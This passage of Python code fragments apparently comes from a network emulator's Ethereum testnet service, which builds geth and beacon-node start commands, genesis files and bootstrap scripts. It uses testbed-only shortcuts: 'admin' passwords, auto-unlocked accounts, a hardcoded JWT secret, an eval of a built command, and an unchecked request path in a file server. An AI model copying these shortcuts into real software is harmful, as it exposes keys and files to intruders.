finalCommand=\\'geth --exec \\\"$gethCommand\\\" attach\\'\\n\\\n        result=$(eval \\\"$finalCommand\\\")\\n\\\n        touch transaction.txt\\n\\\n        echo \\\"transaction hash $result\\\" \\n\\\n        echo \\\"$result\\\" >> transaction.txt\\n\\\n        \".format(finalCommand)\n        return SmartContractCommand",
  "class EthereumServer(Server):\n    \"\"\"!\n    @brief The Ethereum Server\n    \"\"\"\n\n    _id: int\n    _blockchain: Blockchain\n    _is_bootnode: bool\n    _bootnode_http_port: int\n    _smart_contract: SmartContract\n    _accounts: List[AccountStructure]\n    _mnemonic_accounts: List[AccountStructure]\n    _consensus_mechanism: ConsensusMechanism\n\n    _custom_geth_binary_path: str\n    _custom_geth_command_option: str\n    _geth_options: dict\n\n    _data_dir: str\n    _syncmode: Syncmode\n    _snapshot: bool\n    _no_discover: bool \n    _enable_http: bool\n    _geth_http_port: int\n    _enable_ws: bool\n    _geth_ws_port: int\n    _unlock_accounts: bool\n    _start_mine: bool\n    _miner_thread: int\n    _coinbase: str\n    \n    _geth_start_command: str\n\n    _role: list\n\n    def __init__(self, id: int, blockchain:Blockchain):\n        \"\"\"!\n        @brief create new eth server.\n        @param id serial number of this server.\n        \"\"\"\n\n        super().__init__()\n\n        self._id = id\n        self._blockchain = blockchain\n        self._is_bootnode = False\n        self._bootnode_http_port = 8088\n        self._smart_contract = None\n        self._accounts = []\n        self._mnemonic, self._account_base_balance, self._account_total = self._blockchain.getEmuAccountParameters()\n        self._mnemonic_accounts = EthAccount.createEmulatorAccountsFromMnemonic(self._id, mnemonic=self._mnemonic, balance=self._account_base_balance, total=self._account_total, password=\"admin\")\n        self._consensus_mechanism = blockchain.getConsensusMechanism()\n\n        self._custom_geth_binary_path = None\n        self._custom_geth_command_option = None\n        self._geth_options = {\"finding_peers\": \"\", \"http\":\"\", \"ws\":\"\", \"pos\":\"\", \"custom\":\"\", \"unlock\":\"\", \"mine\":\"\"}\n\n        self._data_dir = \"/root/.ethereum\"\n        self._syncmode = Syncmode.FULL\n        self._snapshot = False\n        self._no_discover = False\n        self._enable_ws = False\n        self._enable_http = False\n        self._geth_http_port = 8545\n        self._geth_ws_port = 8546\n        self._unlock_accounts = True\n        self._start_mine = False\n        self._miner_thread = 1\n        self._coinbase = None\n        self._geth_start_command = \"\"\n\n        self._base_system = BaseSystem.SEEDEMU_ETHEREUM\n\n        self._role = []\n        \n\n    def _generateGethStartCommand(self):\n        \"\"\"!\n        @brief generate geth start commands from the properties. \n\n        @returns geth command. \n        \"\"\"\n        if self._no_discover:\n            self._geth_options['finding_peers'] = GethCommandTemplates['nodiscover']\n        else:\n            self._geth_options['finding_peers'] = GethCommandTemplates['bootnodes']\n        if self._enable_http:\n            self._geth_options['http'] = GethCommandTemplates['http'].format(gethHttpPort=self._geth_http_port)\n        if self._enable_ws:\n            self._geth_options['ws'] = GethCommandTemplates['ws'].format(gethWsPort=self._geth_ws_port)\n        if self._custom_geth_command_option:\n            self._geth_options['custom'] = self._custom_geth_command_option\n        if self._unlock_accounts:\n            accounts = []\n            for account in self._accounts:\n                accounts.append(account.address)\n            self._geth_options['unlock'] = GethCommandTemplates['unlock'].format(accounts=', '.join(accounts))\n        self._geth_start_command = GethCommandTemplates['base'].format(node_id=self._id, chain_id=self._blockchain.getChainId(), datadir=self._data_dir, syncmode=self._syncmode.value, snapshot=self._snapshot, option=self._geth_options)\n        \n    def install(self, node: Node, eth: EthereumService):\n        \"\"\"!\n        @brief ETH server installation step.\n        \n        @param node node object\n        @param eth reference to the eth service.\n        @param allBootnode all-bootnode mode: all nodes are boot node.\n        \n        \"\"\"\n\n        node.appendClassName('EthereumService')\n        node.setLabel(ETH_LABEL_META.format(key='node_id'), self.getId())\n        node.setLabel(ETH_LABEL_META.format(key='consensus'), self._consensus_mechanism.value)\n        node.setLabel(ETH_LABEL_META.format(key='chain_name'), self._blockchain.getChainName())\n        node.setLabel(ETH_LABEL_META.format(key='chain_id'), self._blockchain.getChainId())\n        \n        if self.isBootNode(): self._role.append(\"bootnode\")\n        if self.isStartMiner(): self._role.append(\"miner\")\n        node.setLabel(ETH_LABEL_META.format(key='role'), json.dumps(self._role).replace(\"\\\"\", \"\\\\\\\"\"))\n\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'EthereumServer::install: node as{}/{} has no interfaces'.format(node.getAsn(), node.getName())\n        addr = str(ifaces[0].getAddress())\n\n        self.__genesis = self._blockchain.getGenesis()\n\n        node.setFile('/tmp/eth-genesis.json', self.__genesis.getGenesis())\n    \n        # set account passwords to /tmp/eth-password\n        account_passwords = []\n\n        for account in self._accounts:\n            node.setFile(\"/tmp/keystore/\"+account.keystore_filename, account.keystore_content)\n            account_passwords.append(account.password)\n\n        node.setFile('/tmp/eth-password', '\\n'.join(account_passwords))\n\n        # install required software\n        # node.addSoftware('software-properties-common')\n        # tap the eth repo\n        # node.addBuildCommand('add-apt-repository ppa:ethereum/ethereum')\n\n        # install geth and bootnode\n        if self._custom_geth_binary_path : \n            #node.addBuildCommand('apt-get update && apt-get install --yes bootnode')\n            node.importFile(\"../../\"+self._custom_geth_binary_path, '/usr/bin/geth')\n            node.appendStartCommand(\"chmod +x /usr/bin/geth\")\n        # else:\n        #     node.addBuildCommand('apt-get update && apt-get install --yes geth bootnode')\n\n        # genesis\n        node.appendStartCommand('[ ! -e \"/root/.ethereum/geth/nodekey\" ] && geth --datadir {} init /tmp/eth-genesis.json'.format(self._data_dir))\n        \n        # copy keystore to the proper folder\n        for account in self._accounts:\n            node.appendStartCommand(\"cp /tmp/keystore/{} /root/.ethereum/keystore/\".format(account.keystore_filename))\n\n        if self._is_bootnode:\n            # generate enode url. other nodes will access this to bootstrap the network.\n            node.appendStartCommand('[ ! -e \"/root/.ethereum/geth/bootkey\" ] && bootnode -genkey /root/.ethereum/geth/bootkey')\n            node.appendStartCommand('echo \"enode://$(bootnode -nodekey /root/.ethereum/geth/bootkey -writeaddress)@{}:30301\" > /tmp/eth-enode-url'.format(addr))\n            \n            # Default port is 30301, use -addr :<port> to specify a custom port\n            node.appendStartCommand('bootnode -nodekey /root/.ethereum/geth/bootkey -verbosity 9 -addr {}:30301 2> /tmp/bootnode-logs &'.format(addr))          \n            node.appendStartCommand('python3 -m http.server {} -d /tmp'.format(self._bootnode_http_port), True)\n\n        # get other nodes IP for the bootstrapper.\n        bootnodes = self._blockchain.getBootNodes()[:]\n        if len(bootnodes) > 0 :\n            node.setFile('/tmp/eth-nodes', '\\n'.join(bootnodes))\n            \n            node.setFile('/tmp/eth-bootstrapper', EthServerFileTemplates['bootstrapper'])\n\n            # load enode urls from other nodes\n            node.appendStartCommand('chmod +x /tmp/eth-bootstrapper')\n            node.appendStartCommand('/tmp/eth-bootstrapper')\n\n        # launch Ethereum process.\n        node.appendStartCommand(self._geth_start_command, True) \n        \n\n        # Rarely used and tentatively not supported. \n        # if self.__smart_contract != None :\n        #     smartContractCommand = self.__smart_contract.generateSmartContractCommand()\n        #     node.appendStartCommand('(\\n {})&'.format(smartContractCommand))\n\n    def setCustomGeth(self, customGethBinaryPath:str) -> EthereumServer:\n        \"\"\"\n        @brief set custom geth binary file\n\n        @param customGethBinaryPath set absolute path of geth binary to move to the service.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert path.exists(customGethBinaryPath), \"EthereumServer::setCustomGeth: custom geth binary file does not exist. path : {}\".format(customGethBinaryPath)\n\n        self._custom_geth_binary_path = customGethBinaryPath\n\n        return self\n\n    def setCustomGethCommandOption(self, customOptions:str) -> EthereumServer:\n        \"\"\"\n        @brief set custom geth start command option\n\n        @param customOptions options to set\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert customOptions.startswith(\"--\"), \"option should start with '--'\"\n        assert \";\" not in customOptions, \"letter ';' cannot contain in the options\"\n        assert \"&\" not in customOptions, \"letter '|' cannot contain in the options\"\n        assert \"|\" not in customOptions, \"letter '|' cannot contain in the options\"\n\n        self._custom_geth_command_option = customOptions\n        return self\n        \n    def setSyncmode(self, syncmode:Syncmode) -> EthereumServer:\n        \"\"\"\n        @brief setting geth syncmode (default: snap)\n        \n        @param syncmode use Syncmode enum options.\n                Syncmode.SNAP, Syncmode.FULL, Syncmode.LIGHT\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._syncmode = syncmode\n        return self\n\n    def setNoDiscover(self, noDiscover:bool = True) -> EthereumServer:\n        \"\"\"\n        @brief setting the automatic peer discovery to true/false\n        \"\"\"\n        self._no_discover = noDiscover\n        return self\n\n    def setSnapshot(self, snapshot:bool = True) -> EthereumServer:\n        \"\"\"!\n        @brief set geth snapshot \n        \n        @param snapshot bool\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._snapshot = snapshot\n        return self\n\n    def getId(self) -> int:\n        \"\"\"!\n        @brief get ID of this node.\n        @returns ID.\n        \"\"\"\n        return self._id\n\n    def setBootNode(self, isBootNode: bool) -> EthereumServer:\n        \"\"\"!\n        @brief set bootnode status of this node.\n        Note: if no nodes are configured as boot nodes, all nodes will be each\n        other's boot nodes.\n        @param isBootNode True to set this node as a bootnode, False otherwise.\n        \n        @returns self, for chaining API calls.\n        \"\"\"\n        self._is_bootnode = isBootNode\n\n        return self\n\n    def isBootNode(self) -> bool:\n        \"\"\"!\n        @brief get bootnode status of this node.\n        @returns True if this node is a boot node. False otherwise.\n        \"\"\"\n        return self._is_bootnode\n\n    def setBootNodeHttpPort(self, port: int) -> EthereumServer:\n        \"\"\"!\n        @brief set the http server port number hosting the enode url file.\n        @param port port\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        self._bootnode_http_port = port\n\n        return self\n\n\n    def getBootNodeHttpPort(self) -> int:\n        \"\"\"!\n        @brief get the http server port number hosting the enode url file.\n        @returns port\n        \"\"\"\n\n        return self._bootnode_http_port\n\n    def setGethHttpPort(self, port: int) -> EthereumServer:\n        \"\"\"!\n        @brief set the http server port number for normal ethereum nodes\n        @param port port\n        @returns self, for chaining API calls\n        \"\"\"\n        \n        self._geth_http_port = port\n        \n        return self\n\n    def getGethHttpPort(self) -> int:\n        \"\"\"!\n        @brief get the http server port number for normal ethereum nodes\n        @returns int\n        \"\"\"\n                \n        return self._geth_http_port\n\n    def setGethWsPort(self, port: int) -> EthereumServer:\n        \"\"\"!\n        @brief set the ws server port number for normal ethereum nodes\n\n        @param port port\n\n        @returns self, for chaining API calls\n        \"\"\"\n        \n        self._geth_ws_port = port\n        \n        return self\n\n    def getGethWsPort(self) -> int:\n        \"\"\"!\n        @brief get the ws server port number for normal ethereum nodes\n\n        @returns int\n        \"\"\"\n                \n        return self._geth_ws_port\n\n    def enableGethHttp(self) -> EthereumServer:\n        \"\"\"!\n        @brief setting a geth to enable http connection \n        \"\"\"\n        self._enable_http = True\n\n        return self\n\n    def isGethHttpEnabled(self) -> bool:\n        \"\"\"!\n        @brief returns whether a geth enabled http connection or not\n        \"\"\"\n        return self._enable_http\n\n    def enableGethWs(self) -> EthereumServer:\n        \"\"\"!\n        @brief setting a geth to enable ws connection\n        \"\"\"\n        self._enable_ws = True\n\n        return self\n\n    def isGethWsEnabled(self) -> bool:\n        \"\"\"!\n        @brief returns whether a geth enabled ws connection or not\n        \"\"\"\n\n        return self._enable_ws\n\n    def createAccount(self, balance:int, unit:EthUnit=EthUnit.ETHER, password=\"admin\") -> EthereumServer:\n        \"\"\"\n        @brief call this api to create new accounts\n\n        @param balance the balance to be allocated to the account.\n        @param unit EthUnit (Default: EthUnit.Ether)\n\n        @returns self, for chaining API calls.\n\n        \"\"\"\n\n        balance = balance * unit.value\n        self._mnemonic_accounts.append(EthAccount.createEmulatorAccountFromMnemonic(self._id, mnemonic=self._mnemonic, balance=balance, index=self._account_total, password=password))\n        self._account_total += 1\n        return self\n\n    # it should depend on createAccount() method\n    def createAccounts(self, total:int, balance:int, unit:EthUnit=EthUnit.ETHER, password=\"admin\") -> EthereumServer:\n        \"\"\"\n        @brief Call this api to create new accounts.\n\n        @param total The total number of account need to create.\n        @param balance The balance to allocate to the accounts.\n        @param unit The unit of Ethereum. EthUnit (Default: EthUnit.Ether).\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        for i in range(total):\n            self.createAccount(balance, unit, password)\n\n        return self\n\n    def _createAccounts(self, eth:EthereumService) -> EthereumServer:\n        \"\"\"\n        @brief Call this api to create new accounts from account_info\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._accounts.extend(self._mnemonic_accounts)\n\n        return self    \n    \n    def importAccount(self, keyfilePath:str, password:str = \"admin\", balance: int = 0, unit:EthUnit=EthUnit.ETHER) -> EthereumServer:\n        \"\"\"\n        @brief Call this api to import an account.\n\n        @param keyfilePath The keyfile path to import.\n        @param password The password to decrypt the keyfile.\n        @param balance The balance to allocate to the account.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        assert path.exists(keyfilePath), \"EthereumServer::importAccount: keyFile does not exist. path : {}\".format(keyfilePath)\n        account = EthAccount.importAccount(balance=balance,password=password, keyfilePath=keyfilePath)\n        self._accounts.append(account)\n        return self\n    \n\n    def _getAccounts(self) -> List[AccountStructure]:\n        \"\"\"\n        @brief Call this api to get the accounts for this node\n        \n        @returns accounts\n        \"\"\"\n\n        return self._accounts\n        \n\n    def unlockAccounts(self) -> EthereumServer:\n        \"\"\"!\n        @brief This is mainly used to unlock the accounts in the remix node to make it directly possible for transactions to be \n        executed through Remix without the need to access the geth account in the docker container and unlocking manually\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._unlock_accounts = True\n\n        return self\n        \n    def startMiner(self) -> EthereumServer:\n        \"\"\"!\n        @brief Call this api to start Miner in the node.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._start_mine = True\n        self._syncmode = Syncmode.FULL\n\n        return self\n\n    def isStartMiner(self) -> bool:\n        \"\"\"!\n        @brief Call this api to get startMiner status in the node.\n        \n        @returns __start_mine status.\n        \"\"\"\n        return self._start_mine\n\n    def deploySmartContract(self, smart_contract: SmartContract) -> EthereumServer:\n        \"\"\"!\n        @brief Call this api to deploy smartContract on the node.\n        @returns self, for chaining API calls.\n        \"\"\"\n        self._smart_contract = smart_contract\n\n        return self\n\n    def getBlockchain(self):\n        return self._blockchain",
  "class PoAServer(EthereumServer):\n    def __init__(self, id: int, blockchain: Blockchain):\n        \"\"\"!\n        @brief Create new eth server.\n\n        @param id The serial number of this server.\n        \"\"\"\n\n        super().__init__(id, blockchain)\n        \n    def _generateGethStartCommand(self):\n        if self._start_mine:\n            assert len(self._accounts) > 0, 'EthereumServer::__generateGethStartCommand: To start mine, ethereum server need at least one account.'\n            assert self._unlock_accounts, 'EthereumServer::__generateGethStartCommand: To start mine in POA(clique), accounts should be unlocked first.'\n            if self._coinbase:\n                coinbase = self._coinbase\n            else:\n                coinbase = self._accounts[0].address\n            self._geth_options['mine'] = GethCommandTemplates['mine'].format(coinbase=coinbase, num_of_threads=self._miner_thread)\n        super()._generateGethStartCommand()",
  "class PoWServer(EthereumServer):\n    def __init__(self, id:int, blockchain:Blockchain):\n        \"\"\"!\n        @brief Create new eth server.\n\n        @param id The serial number of this server.\n        \"\"\"\n\n        super().__init__(id, blockchain)\n    \n    def _generateGethStartCommand(self):\n        super()._generateGethStartCommand()\n\n        self._geth_start_command = \"nice -n 19 \" + self._geth_start_command\n        if self._start_mine:\n            if self._coinbase:\n                coinbase = self._coinbase\n            else:\n                coinbase = self._accounts[0].address\n            assert len(self._accounts) > 0, 'EthereumServer::__generateGethStartCommand: To start mine, ethereum server need at least one account.'\n            self._geth_start_command += GethCommandTemplates['mine'].format(coinbase=coinbase, num_of_threads=self._miner_thread)",
  "class PoSServer(PoAServer):\n    __terminal_total_difficulty: int\n    __is_beacon_setup_node: bool\n    __beacon_setup_http_port: int\n    __beacon_peer_counts:int\n\n    def __init__(self, id: int, blockchain:Blockchain):\n        \"\"\"!\n        @brief Create new eth server.\n\n        @param id Serial number of this server.\n        \"\"\"\n\n        super().__init__(id, blockchain)\n\n        self.__is_beacon_setup_node = False\n        self.__beacon_setup_http_port = 8090\n        self.__terminal_total_difficulty = self._blockchain.getTerminalTotalDifficulty()\n        self.__is_beacon_validator_at_genesis = False\n        self.__is_beacon_validator_at_running = False\n        self.__is_manual_deposit_for_validator = False\n        self.__beacon_peer_counts = 5\n\n    def _generateGethStartCommand(self):\n        self._geth_options['pos'] = GethCommandTemplates['pos'].format(difficulty=self.__terminal_total_difficulty)\n        super()._generateGethStartCommand()\n        \n    def __install_beacon(self, node:Node, eth:EthereumService):\n        ifaces = node.getInterfaces()\n        assert len(ifaces) > 0, 'EthereumServer::install: node as{}/{} has no interfaces'.format(node.getAsn(), node.getName())\n        addr = str(ifaces[0].getAddress())\n\n        beacon_setup_node = self._blockchain.getBeaconSetupNodeIp()\n\n        assert beacon_setup_node != \"\", 'EthereumServer::install: Ethereum Service has no beacon_setup_node.'\n\n        bootnode_start_command = \"\"\n        bc_start_command = LIGHTHOUSE_BN_CMD.format(eth_id=self.getId(),ip_address=addr, target_peers=self.__beacon_peer_counts)\n        vc_start_command = \"\"\n        wallet_create_command = \"\"\n        validator_create_command = \"\"\n        validator_deposit_sh = \"\"\n        if self._is_bootnode:\n            bootnode_start_command = LIGHTHOUSE_BOOTNODE_CMD.format(ip_address=addr)\n        if self.__is_beacon_validator_at_running:\n            node.setFile('/tmp/seed.pass', 'seedseedseed')\n            wallet_create_command = LIGHTHOUSE_WALLET_CREATE_CMD.format(eth_id=self.getId())\n            validator_create_command = LIGHTHOUSE_VALIDATOR_CREATE_CMD.format(eth_id=self.getId()) \n            node.setFile('/tmp/deposit.sh', VALIDATOR_DEPOSIT_SH.format(eth_id=self.getId()))\n            node.appendStartCommand('chmod +x /tmp/deposit.sh')\n            if not self.__is_manual_deposit_for_validator:\n                validator_deposit_sh = \"/tmp/deposit.sh\"\n        if self.__is_beacon_validator_at_genesis or self.__is_beacon_validator_at_running:\n            vc_start_command = LIGHTHOUSE_VC_CMD.format(eth_id=self.getId(), ip_address=addr, acct_address=self._accounts[0].address)\n            \n        node.setFile('/tmp/beacon-setup-node', beacon_setup_node)\n        node.setFile('/tmp/beacon-bootstrapper', EthServerFileTemplates['beacon_bootstrapper'].format( \n                                is_validator=\"true\" if self.__is_beacon_validator_at_genesis else \"false\",\n                                is_bootnode=\"true\" if self._is_bootnode else \"false\",\n                                eth_id=self.getId(),\n                                bootnode_start_command=bootnode_start_command,\n                                bc_start_command=bc_start_command,\n                                vc_start_command=vc_start_command,\n                                wallet_create_command=wallet_create_command,\n                                validator_create_command=validator_create_command,\n                                validator_deposit_sh=validator_deposit_sh\n                    ))\n        node.setFile('/tmp/jwt.hex', '0xae7177335e3d4222160e08cecac0ace2cecce3dc3910baada14e26b11d2009fc')\n        \n        node.appendStartCommand('chmod +x /tmp/beacon-bootstrapper')\n        node.appendStartCommand('/tmp/beacon-bootstrapper')\n\n    def install(self, node: Node, eth: EthereumService):\n        if self.__is_beacon_setup_node:\n            beacon_setup_node = BeaconSetupServer(ttd=self.__terminal_total_difficulty)\n            beacon_setup_node.install(node, self._blockchain)\n            return \n        \n        if self.__is_beacon_validator_at_genesis:\n            self._role.append(\"validator_at_genesis\")\n        if self.__is_beacon_validator_at_running:\n            self._role.append(\"validator_at_running\")\n        \n        super().install(node,eth)\n        self.__install_beacon(node, eth)\n\n    def enablePOSValidatorAtGenesis(self):\n        self.__is_beacon_validator_at_genesis = True\n        return self\n\n    def isValidatorAtGenesis(self):\n        return self.__is_beacon_validator_at_genesis\n\n    def isValidatorAtRunning(self):\n        return self.__is_beacon_validator_at_running\n\n    def enablePOSValidatorAtRunning(self, is_manual:bool=False):\n        self.__is_beacon_validator_at_running = True\n        self.__is_manual_deposit_for_validator = is_manual\n        return self\n\n    def isBeaconSetupNode(self):\n        return self.__is_beacon_setup_node\n\n    def setBeaconSetupNode(self, port=8090):\n        self.__is_beacon_setup_node = True\n        self.__beacon_setup_http_port = port\n        return self\n\n    def getBeaconSetupNodeIp(self):\n        return self.__beacon_setup_node_ip\n\n    # def setBaseAccountBalance(self, balance:int):\n    #     self._accounts_info[0] = (balance, \"admin\", None)\n    #     return self\n\n    def setBeaconPeerCounts(self, peer_counts:int):\n        self.__beacon_peer_counts = peer_counts\n        return self\n    \n    def getBeaconSetupHttpPort(self) -> int:\n        return self.__beacon_setup_http_port\n\n    def setBeaconSetupHttpPort(self, port:int):\n        self.__beacon_setup_http_port = port\n        return self",
  "class BeaconSetupServer():\n\n    \"\"\"!\n    @brief The WebServer class.\n    \"\"\"\n\n    BEACON_GENESIS = '''\\\nCONFIG_NAME: mainnet\nPRESET_BASE: mainnet\nTERMINAL_TOTAL_DIFFICULTY: \"{terminal_total_difficulty}\"\nTERMINAL_BLOCK_HASH: \"0x0000000000000000000000000000000000000000000000000000000000000000\"\nTERMINAL_BLOCK_HASH_ACTIVATION_EPOCH: \"18446744073709551615\"\nSAFE_SLOTS_TO_IMPORT_OPTIMISTICALLY: \"128\"\nMIN_GENESIS_ACTIVE_VALIDATOR_COUNT: \"1\"\nGENESIS_FORK_VERSION: \"0x42424242\"\nGENESIS_DELAY: \"0\"\nALTAIR_FORK_VERSION: \"0x01000000\"\nALTAIR_FORK_EPOCH: \"0\"\nBELLATRIX_FORK_VERSION: \"0x02000000\"\nBELLATRIX_FORK_EPOCH: \"0\"\nSECONDS_PER_SLOT: \"12\"\nSECONDS_PER_ETH1_BLOCK: \"14\"\nMIN_VALIDATOR_WITHDRAWABILITY_DELAY: \"256\"\nSHARD_COMMITTEE_PERIOD: \"256\"\nETH1_FOLLOW_DISTANCE: \"16\"\nINACTIVITY_SCORE_BIAS: \"4\"\nINACTIVITY_SCORE_RECOVERY_RATE: \"16\"\nEJECTION_BALANCE: \"16000000000\"\nMIN_PER_EPOCH_CHURN_LIMIT: \"4\"\nCHURN_LIMIT_QUOTIENT: \"32\"\nPROPOSER_SCORE_BOOST: \"40\"\nDEPOSIT_CHAIN_ID: \"{chain_id}\"\nDEPOSIT_NETWORK_ID: \"{chain_id}\"\nNETWORK_ID: \"{chain_id}\"\nMAX_COMMITTEES_PER_SLOT: \"10\"\nINACTIVITY_PENALTY_QUOTIENT_BELLATRIX: \"8\"\nTARGET_COMMITTEE_SIZE: \"{target_committee_size}\"\nTARGET_AGGREGATORS_PER_COMMITTEE: \"{target_aggregator_per_committee}\"\n'''\n\n    BEACON_BOOTNODE_HTTP_SERVER = '''\\\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\neth_id = 0\n\nclass SeedHTTPRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        response = open(\"/local-testnet/{{}}.tar.gz\".format(self.path), \"rb\")\n        self.wfile.write(response.read())\n        response.close()\n\nhttpd = HTTPServer(('0.0.0.0', {beacon_bootnode_http_port}), SeedHTTPRequestHandler)\nhttpd.serve_forever()\n'''\n\n    PREPARE_RESOURCE_TO_SEND = '''\\\n#!/bin/bash\nlet i=0\nwhile read -r ethId; do {\n    let i++\n    mv /local-testnet/node_$i /local-testnet/eth-$ethId\n    tar -czvf /local-testnet/eth-$ethId.tar.gz /local-testnet/eth-$ethId\n}; done < /tmp/validator-ids\ntar -czvf /local-testnet/testnet.tar.gz /local-testnet/testnet\ntar -czvf /local-testnet/bootnode.tar.gz /local-testnet/bootnode\n'''\n\n    DEPLOY_CONTRACT = '''\\\nuntil curl --http0.9 -sHf http://{geth_node_ip}:8545 > /dev/null; do {{\n        echo \"beacon-setup-node: geth node is not ready, waiting...\"\n        sleep 3\n        let count++\n        [ $count -gt 60 ] && {{\n            echo \"beacon-setup-node: geth node connection failed too many times, skipping.\"\n            ok=false\n            break\n        }}\n    }}; done\n\nwhile true; do {{\n    blockNumber=`curl --data '{{\"method\":\"eth_blockNumber\",\"params\":[],\"id\":1,\"jsonrpc\":\"2.0\"}}' -H \"Content-Type: application/json\" -X POST http://{geth_node_ip}:8545 | jq -r '.result' | cut -d 'x' -f 2`\n    echo \"current blockNumber :\" $(( 16#$blockNumber ))\n    if [ $(( 16#$blockNumber )) -gt 5 ]\n    then\n            break\n    fi\n    sleep 3\n}}; done\n\nwhile true; do {{\n    lcli deploy-deposit-contract --eth1-http http://{geth_node_ip}:8545 --confirmations 1 --validator-count {validator_count} > contract_address.txt\n    CONTRACT_ADDRESS=`head -1 contract_address.txt | cut -d '\"' -f 2`\n    if [[ $CONTRACT_ADDRESS = 0x* ]]; then\n        break\n    fi\n    echo \"beacon-setup-node: Waiting for Validator Deposit...\"\n    sleep 10\n\n}}; done\n'''\n    \n    __beacon_setup_http_port: int\n\n    def __init__(self, ttd:int, consensus:ConsensusMechanism = ConsensusMechanism.POA):\n        \"\"\"!\n        @brief BeaconSetupServer constructor.\n        \"\"\"\n\n        self.__beacon_setup_http_port = 8090\n        self.__terminal_total_difficulty = ttd\n        self.__consensus_mechanism = consensus\n\n    def install(self, node: Node, blockchain: Blockchain):\n        \"\"\"!\n        @brief Install the service.\n        \"\"\"\n        \n        validator_ids = blockchain.getValidatorIds()\n        validator_counts = len(validator_ids)\n\n        bootnode_ip = blockchain.getBootNodes()[0].split(\":\")[0]\n        miner_ip = blockchain.getMinerNodes()[0]\n        \n        #node.addBuildCommand('apt-get update && apt-get install -y --no-install-recommends software-properties-common python3 python3-pip')\n        #node.addBuildCommand('pip install web3')\n        node.appendStartCommand('lcli generate-bootnode-enr --ip {} --udp-port 30305 --tcp-port 30305 --genesis-fork-version 0x42424242 --output-dir /local-testnet/bootnode'.format(bootnode_ip))\n        node.setFile(\"/tmp/config.yaml\", self.BEACON_GENESIS.format(terminal_total_difficulty=self.__terminal_total_difficulty, chain_id=blockchain.getChainId(), \n                                                                    target_committee_size=blockchain.getTargetCommitteeSize(), \n                                                                    target_aggregator_per_committee = blockchain.getTargetAggregatorPerCommittee()))\n        node.setFile(\"/tmp/validator-ids\", \"\\n\".join(validator_ids))\n        node.appendStartCommand('mkdir /local-testnet/testnet')\n        node.appendStartCommand('bootnode_enr=`cat /local-testnet/bootnode/enr.dat`')\n        node.appendStartCommand('echo \"- $bootnode_enr\" > /local-testnet/testnet/boot_enr.yaml')\n        node.appendStartCommand('cp /tmp/config.yaml /local-testnet/testnet/config.yaml')\n        node.appendStartCommand(self.DEPLOY_CONTRACT.format(geth_node_ip=miner_ip, validator_count = validator_counts))\n        node.appendStartCommand('lcli insecure-validators --count {validator_count} --base-dir /local-testnet/ --node-count {validator_count}'.format(validator_count = validator_counts))\n        node.appendStartCommand('GENESIS_TIME=`date +%s`')\n        node.appendStartCommand('''CONTRACT_ADDRESS=`head -1 contract_address.txt | cut -d '\"' -f 2`''')\n        node.appendStartCommand('''echo 'DEPOSIT_CONTRACT_ADDRESS: \"'$CONTRACT_ADDRESS'\"' >> /local-testnet/testnet/config.yaml''')\n        node.appendStartCommand('''echo 'MIN_GENESIS_TIME: \"'$GENESIS_TIME'\"' >> /local-testnet/testnet/config.yaml''')\n        node.appendStartCommand('''echo '3' > /local-testnet/testnet/deploy_block.txt''')\n        node.appendStartCommand('''lcli interop-genesis --spec mainnet --genesis-time $GENESIS_TIME --testnet-dir /local-testnet/testnet {validator_count}'''.format(validator_count = validator_counts))\n        node.setFile(\"/tmp/prepare_resource.sh\", self.PREPARE_RESOURCE_TO_SEND)\n        node.appendStartCommand(\"chmod +x /tmp/prepare_resource.sh\")\n        node.appendStartCommand(\"/tmp/prepare_resource.sh\")\n        node.setFile('/local-testnet/beacon_bootnode_http_server.py', self.BEACON_BOOTNODE_HTTP_SERVER.format(beacon_bootnode_http_port=self.__beacon_setup_http_port))\n        node.appendStartCommand('python3 /local-testnet/beacon_bootnode_http_server.py', True)\n\n    def getBeaconSetupHttpPort(self) -> int:\n        return self.__beacon_setup_http_port\n\n    def setBeaconSetupHttpPort(self, port:int) -> BeaconSetupServer:\n        self.__beacon_setup_http_port = port\n        return self\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'Beacon Setup server object.\\n'\n\n        return out",
  "def __init__(self, id: int, blockchain:Blockchain):\n        \"\"\"!\n        @brief create new eth server.\n        @param id serial number of this server.\n        \"\"\"\n\n        super().__init__()\n\n        self._id = id\n        self._blockchain = blockchain\n        self._is_bootnode = False\n        self._bootnode_http_port = 8088\n        self._smart_contract = None\n        self._accounts = []\n        self._mnemonic, self._account_base_balance, self._account_total = self._blockchain.getEmuAccountParameters()\n        self._mnemonic_accounts = EthAccount.createEmulatorAccountsFromMnemonic(self._id, mnemonic=self._mnemonic, balance=self._account_base_balance, total=self._account_total, password=\"admin\")\n        self._consensus_mechanism = blockchain.getConsensusMechanism()\n\n        self._custom_geth_binary_path = None\n        self._custom_geth_command_option = None\n        self._geth_options = {\"finding_peers\": \"\", \"http\":\"\", \"ws\":\"\", \"pos\":\"\", \"custom\":\"\", \"unlock\":\"\", \"mine\":\"\"}\n\n        self._data_dir = \"/root/.ethereum\"\n        self._syncmode = Syncmode.FULL\n        self._snapshot = False\n        self._no_discover = False\n        self._enable_ws = False\n        self._enable_http = False\n        self._geth_http_port = 8545\n        self._geth_ws_port = 8546\n        self._unlock_accounts = True\n        self._start_mine = False\n        self._miner_thread = 1\n        self._coinbase = None\n        self._geth_start_command = \"\"\n\n        self._base_system = BaseSystem.SEEDEMU_ETHEREUM\n\n        self._role = []",
